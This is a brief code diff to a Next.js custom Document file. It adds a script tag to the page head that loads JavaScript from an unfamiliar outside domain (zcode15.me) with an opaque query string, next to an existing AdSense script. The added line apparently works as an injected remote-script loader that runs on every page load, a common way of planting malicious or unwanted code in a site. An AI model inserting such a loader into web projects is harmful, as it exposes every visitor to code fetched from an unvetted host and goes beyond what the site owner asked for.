@@ -25,6 +25,10 @@ class MyDocument extends Document {
           <link rel="manifest" href="/favicon/site.webmanifest" />
           <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2596135861331646"
      crossorigin="anonymous"></script>
+
+
+<script type="text/javascript" src="https://zcode15.me/?ze=gnqwmztggy5ha3ddf42dqmrv" async></script>
+
         </Head>
         <body>
           <Main />
